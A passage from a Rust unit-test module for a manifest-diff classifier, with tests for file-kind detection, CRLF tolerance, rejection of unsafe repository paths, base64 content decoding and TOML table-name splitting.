            "Cargo.lock",
            "package.json.bak",
            "src/main.rs",
            "mcp-loom/package-lock.json",
        ] {
            assert_eq!(
                classify(f, Some("@@ -1 +1 @@\n-a\n+b"), no_head),
                Err(Reason::NotApplicable),
                "{f}"
            );
        }
        assert!(kind_for("a/b/Cargo.toml").is_some());
        assert!(kind_for("mcp-loom/package.json").is_some());
    }

    #[test]
    fn crlf_and_no_newline_marker_are_tolerated() {
        ok(
            "Cargo.toml",
            "@@ -1,2 +1,3 @@\r\n [[bin]]\r\n+name = \"x\"\r\n+path = \"src/x.rs\"\r\n\\ No newline at end of file",
        );
    }

    #[test]
    fn safe_path_rejects_traversal_and_query() {
        assert!(safe_path("loom-daemon/Cargo.toml"));
        for bad in ["", "/a", "a/../b", "a//b", "a?ref=x", "a b", "./a"] {
            assert!(!safe_path(bad), "{bad}");
        }
    }

    #[test]
    fn contents_body_decodes_base64_with_newlines() {
        let body =
            serde_json::json!({"encoding": "base64", "content": "W3BhY2thZ2Vd\nCg=="}).to_string();
        assert_eq!(decode_contents(body.as_bytes()).unwrap(), "[package]\n");
        assert!(decode_contents(br#"{"encoding":"none","content":""}"#).is_err());
        assert!(decode_contents(b"nope").is_err());
    }

    #[test]
    fn table_names_split_on_unquoted_dots_only() {
        assert_eq!(
            table_segments("target.'cfg(unix)'.dependencies"),
            vec!["target", "cfg(unix)", "dependencies"]
        );
        assert_eq!(table_segments("target.\"a.b\".dependencies").len(), 3);
    }
}
